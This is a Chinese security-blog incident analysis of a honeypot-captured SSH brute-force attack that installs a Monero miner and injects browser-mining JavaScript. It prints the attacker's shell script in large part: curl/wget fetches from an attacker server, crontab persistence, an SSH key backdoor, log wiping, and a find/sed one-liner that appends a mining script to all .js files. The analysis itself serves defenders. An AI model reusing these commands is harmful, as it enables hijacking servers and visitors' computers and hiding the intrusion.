***本文作者：colinhe，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。**

## 前言

**数字货币因其技术去中性化和经济价值等属性，逐渐成为大众关注的焦点，同时通过恶意挖矿获取数字货币是黑灰色产业获取收益的重要途径。本文简析通过蜜罐获取的XMR恶意挖矿事件：攻击者通过爆破SSH获取系统权限，配置root用户免密登录,并下载及执行XMR
挖矿程序，及XMR 网页挖矿程序。XMR挖矿程序耗肉鸡CPU/GPU资源，网页挖矿程序耗访问肉鸡服务器JS 网页的客户端资源 。**

![页首配图](https://image.3001.net/images/20181015/1539599698_5bc46d528360f.png!small)

## 一、攻击者获取肉鸡

### 1）SSH暴力破解

2018年10月11日，攻击者使用恶意IP(223.89.72.8)暴力破解Victim的SSH服务成功，获取系统账号权限。

### 2）关闭Victim的防火墙

通过暴力破解获得的账号登录Victim并，进入工作目录/tmp,并尝试关闭主机防火墙。

    
    
    root@victim:~#cd /tmp  
    root@victim:~#/etc/init.d/iptables stop  
    root@victim:~#service iptables stop  
    root@victim:~#SuSefirewall2 stop  
    root@victim:~#reSuSefirewall2 stop

### 3）下载恶意脚本

命令Victim从Malware Server（140.143.35.89:43768）下载恶意文件shz.sh：

    
    
    root@victim:/tmp#wget http://140.143.35.89:43768/shz.sh  
    [4l--2018-10-11 19:07:34--  http://140.143.35.89:43768/shz.sh  
    Connecting to 140.143.35.89:43768... connected.  
    HTTP request sent, awaiting response... 200 OK  
    Length: 7470 (7K) [application/octet-stream]  
    Saving to: `/tmp/shz.sh'  
      
      
    58% [======================>                ] 4,380        41K/s  eta 0s  
    100%[======================================>] 7,470        41K/s  
      
    2018-10-* *:*:* (41 KB/s) - `/tmp/shz.sh' saved [7470/7470]

## 二、执行恶意脚本

获取Victim肉鸡权限及下载恶意脚本后，命令Victim执行/tmp/shz.sh，下面简析shz.sh的恶意行为。

### 1）开始执行

    
    
    root@victim:/tmp#shshz.sh&

### 2）基本配置

获取Victim的定时Crontab定时任务文件及内容，SSH登录的公钥，更改下载文件命令及变量定义等基本配置。

    
    
    #!/bin/sh  
    #Crontab定时任务(crontab -e)  
    crondir='/var/spool/cron/'"$USER"  
    cont=`cat ${crondir}`  
    #SSH登录公钥  
    ssht=`cat /root/.ssh/authorized_keys`  
    #自定义变量  
    echo 1 > /etc/gmbpr  
    rtdir="/etc/gmbpr"  
    bbdir="/usr/bin/curl"  
    bbdira="/usr/bin/url"  
    ccdir="/usr/bin/wget"  
    ccdira="/usr/bin/get"  
    #更改命令名称  
    mv /usr/bin/wget /usr/bin/get  
    mv /usr/bin/curl /usr/bin/url

### 3）判断账号权限（特殊权限）

如果文件/etc/gmbpr存在，即被暴力破解的账号有/etc写权限，一般root。设置工作目录为/etc：

    
    
    if [ -f "$rtdir" ]

 **3.1 定时任务+无密登录**

    
    
    #将恶意脚本/etc/shz.sh加入系统crontab定时任务中  
    [[ $cont =~ "shz.sh" ]] || echo "* * * * * sh /etc/shz.sh >/dev/null 2>&1" >> ${crondir}  
    #将攻击者的SSH登录公钥加入authorized_key中，用于无密登录ssh  
    [[ $ssht =~ "xvsRtqHLMWoh" ]] || echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDFNFCF6tOvSqqN9Zxc/ZkBe2ijEAMhqLEzPe4vprfi  
    PAyGO8CF8tn9dcPQXh9iv5/vYEbaDxEvixkTVSJpWnY/5ckeyYsXU9zEeVbbWkdRcuAs8bdVU7PxVq11HLMxiqSR3MKIj7yEYjclLHRUzgX0mF2/xpZEn4GGL+Kn+7GgxvsRtqH  
    LMWoh2Xoz7f8Rb3KduYiJlZeX02a4qFXHMSkSkMnHirHHtavIFjAB0y952+1DzD36a8IJJcjAGutYjnrZdKP8t3hiEw0UBADhiu3+KU641Kw9BfR9Kg7vZgrVRf7lVzOn6O8Ybq  
    gunZImJt+uLljgpP0ZHd1wGz+QSHEd Administrator@Guess_me" >> /root/.ssh/authorized_keys

 **3.2 恶意挖矿的配置文件**

如果配置文件/etc/com.json不存在，则从<http://140.143.35.89:43768/com.json>下载至/etc/com.json。

    
    
    cfg="/etc/com.json"  
    if [ -f "$cfg" ]  
        then  
            echo "exists config"  
        else  
            if [ -f "$bbdir" ]  
            then  
                    curl --connect-timeout 10 --retry 100 http://140.143.35.89:43768/com.json > /et  
    c/com.json  
            elif [ -f "$bbdira" ]  
            then  
                    url --connect-timeout 10 --retry 100 http://140.143.35.89:43768/com.json > /etc  
    /com.json  
            elif [ -f "$ccdir" ]  
            then  
                    wget --timeout=10 --tries=100 -P /etc http://140.143.35.89:43768/com.json  
            elif [ -f "$ccdira" ]  
            then  
                    get --timeout=10 --tries=100 -P /etc http://140.143.35.89:43768/com.json  
            fi  
     fi

 **3.3 ELF挖矿主程序**

从<http://zjgw-1256891197.cos.ap-beijing.myq>cloud.com下载恶意挖矿主程序zjgw至/etc。zjgw为elf格式的二进制文件。

    
    
    if [ -f "$bbdir" ]  
        then  
            curl --connect-timeout 10 --retry 100 http://zjgw-1256891197.cos.ap-beijing.myqcloud.com/zjgw > /etc/zjgw  
        elif [ -f "$bbdira" ]  
        then  
            url --connect-timeout 10 --retry 100 http://zjgw-1256891197.cos.ap-beijing.myqcloud.com/zjgw > /etc/zjgw      
        elif [ -f "$ccdir" ]  
        then  
            wget --timeout=10 --tries=100 -P /etc http://dwz.cn/hqCK3WKx  
        elif [ -f "$ccdira" ]  
        then  
            get --timeout=10 --tries=100 -P /etc http://dwz.cn/hqCK3WKx  
    fi

 **3.4 运行恶意挖矿程序**

挖矿程序zjgw+配置文件com.json：

    
    
    chmod 777 zjgw  
    #com.json配置文件中将unknow替换成字符${ip}  
    sed -i "s/unknow/${ip}/g" com.json  
     sleep 5s  
    #执行挖矿程序  
    ./zjgw --config=com.json  
    #清除命令日志痕迹  
    history -c  
    echo > /root/.bash_history

 **3.5 下载并运行shz.sh脚本文件**

    
    
    shdir='/etc/shz.sh'  
    if [ -f "$shdir" ]  
        then  
            echo "exists shell"  
        else  
            if [ -f "$bbdir" ]  
            then  
                curl --connect-timeout 10 --retry 100 http://140.143.35.89:43768/shz.sh > /etc/shz.sh  
            elif [ -f "$bbdira" ]  
            then  
                url --connect-timeout 10 --retry 100 http://140.143.35.89:43768/shz.sh > /etc/shz.sh  
            elif [ -f "$ccdir" ]  
            then  
                wget --timeout=10 --tries=100 -P /etc http://140.143.35.89:43768/shz.sh  
            elif [ -f "$ccdira" ]  
            then  
                get --timeout=10 --tries=100 -P /etc http://140.143.35.89:43768/shz.sh  
            fi  
            sh /etc/shz.sh  
    fi

### 4）判断账号权限（普通权限）

如果文件/etc/gmbpr不存在，即被暴力破解的账号是常规用户权限，添加启动脚本至Crontab定时任务中。设置工作目录为/tmp：

    
    
    [[ $cont =~ "shz.sh" ]] || echo "* * * * * sh /tmp/shz.sh >/dev/null 2>&1" >> ${crondir}

> 4.1）下载配置文件com.json至/tmp
>
> 4.2）下载挖矿主程序zjgw至/tmp
>
> 4.3）运行恶意挖矿程序+配置文件（同3.4）
>
> 4.4）下载并运行恶意脚本/tmp/shz.sh（同3.5）

### 5）Monero Javascript网页挖矿

在Victim全盘查找js文件，并插入网页挖矿JS脚本document.write('<script
src="<http://t.cn/EvlonFh>"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');

    
    
    find / -name '*.js'|xargs grep -L f4ce9|xargs sed -i '$a\document.write\('\'\<script\ src=\"http://t.cn/EvlonFh\"\>\</script\>\<script\  
    >OMINEId\(\"e02cf4ce91284dab9bc3fc4cc2a65e28\",\"-1\"\)\</script\>\'\)\;

### 6）清除痕迹

攻击者清除攻击日志痕迹

    
    
    echo > /var/spool/mail/root  
    echo > /var/log/wtmp  
    echo > /var/log/secure  
    echo > /root/.bash_history

## 三、执行ELF挖矿程序

### 1）挖矿配置文件com.json

通过配置文件查看到XMR数字货币的挖矿算法、挖矿地址和钱包地址等：

    
    
    { 
    
    #XMR门罗币的主要共识机制（挖矿算法）:cryptonight 
    
        "algo": "cryptonight", 
    
        "api": { 
    
            "port": 0, 
    
            "access-token": null, 
    
            "worker-id": null, 
    
            "ipv6": false, 
    
            "restricted": true 
    
        }, 
    
        "av": 0, 
    
        "background": true, 
    
        "colors": true, 
    
        "cpu-priority": 5, 
    
        "donate-level": 1, 
    
        "log-file": null, 
    
        "max-cpu-usage": 90, 
    
        "pools": [ 
    
            { 
    
    #挖矿地址 
    
                "url": "stratum+tcp://xmr.f2pool.com:13531", 
    
    #钱包地址 
    
                "user":  
    
    "46j2hc8eJbZZST8L4cpmLdjKKvWnggQVt9HRLYHsCKHUZbuok15X93ag9djxnt2mdpdJPRCsvuHzm92iahdpBxZa3FbBovX.unknow",
    
                "pass": "x", 
    
                "keepalive": true, 
    
                "nicehash": false, 
    
                "variant": -1 
    
            } 
    
        ], 
    
        "print-time": 60, 
    
        "retries": 99999, 
    
        "retry-pause": 5, 
    
        "safe": false, 
    
        "syslog": false, 
    
    }

### 2）挖矿主程序zjgw

zjgw为64为的elf二进制文件，VirusTal检出功能包含了挖矿功能。

![挖矿主程序](https://image.3001.net/images/20181015/1539599951_5bc46e4f64809.png!small)

### 3）矿池及收益

截止当前，攻击者恶意ELF程序使用f2pool矿池，上述钱包地址相关收益信息：

> （1）164矿工正在线进行挖矿；
>
> （2）共捕获254矿工；
>
> （3）此钱包地址总收益4.7XMR，按当前市场价格736RMB价格计算，约收获3459RMB
>
> （4）这些矿工，可能很多是攻击者捕获的肉鸡；攻击者也可能还有更多其他的钱包地址及肉鸡矿工即进行获益。

![f2pool矿池](https://image.3001.net/images/20181015/1539599997_5bc46e7d5892e.png!small)

## 四、Monero Javascript网页挖矿

![Monero
Javascript网页挖矿](https://image.3001.net/images/20181015/1539600068_5bc46ec473107.png!small)

在Victim全盘查找js文件，并插入网页挖矿JS脚本document.write('<script
src="<http://t.cn/EvlonFh>"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');

### 1）curl -I <http://t.cn/EvlonFh>；

短网址指向<https://xmr.omine.org/assets/v7.js>

    
    
    HTTP/1.1 302 Found  
    Date: Mon, 15 Oct 2018 08:02:12 GMT  
    Content-Type: text/html;charset=UTF-8  
    Content-Length: 216  
    Connection: keep-alive  
    Set-Cookie: aliyungf_tc=AQAAAN65sGSyOQcAihDut35iYAxQi2Sj; Path=/; HttpOnly  
    Server: nginx  
    Location: https://xmr.omine.org/assets/v7.js

### 2）curl <https://xmr.omine.org/assets/v7.js>

javascript脚本文件，包含了矿池地址wss://xmr.ominie.org:8181：

![矿池地址](https://image.3001.net/images/20181015/1539600101_5bc46ee5be779.png!small)

### 3）omine矿池

![omine矿池](https://image.3001.net/images/20181015/1539600123_5bc46efbc3e58.png!small)

### 4）隐藏后的钱包地址ID

    
    
    OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")

![隐藏后的钱包地址ID](https://image.3001.net/images/20181015/1539600143_5bc46f0f6a452.png!small)

### 5）收益

假设攻击者的JS网页挖矿与ELF程序挖矿使用的同一个钱包地址:46j2hc8eJbZZST8L4cpmLdjKKvWnggQVt9HRLYHsCKHUZbuok15X93ag9djxnt2mdpdJPRCsvuHzm92iahdpBxZa3FbBovX
,此处收益相对较少，有0.037个XMR。

![收益](https://image.3001.net/images/20181015/1539600169_5bc46f2980857.png!small)

## 五、小结

攻击者通过SSH暴力破解获取系统账号后，一方面通过下载及运行ELF二进制挖矿程序，利用系统CPU/GPU资源进行XMR（门罗币）挖矿；另一方面，通过在系统里面的JS文件中插入JS网页挖矿的代码，利用远程访问系统JS网页的客户端资源进行XMR网页挖矿。建议措施：

> （1）账号加固；
>
> （2）系统资源、网络、进程监控；
>
> （3）检查系统是否有恶意资源滥用情况（ELF挖矿程序）；
>
> （4）检查系统是否有恶意JS网页挖矿脚本（网页挖矿脚本）；
>
> （5）其他

 ***本文作者：colinhe，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。**

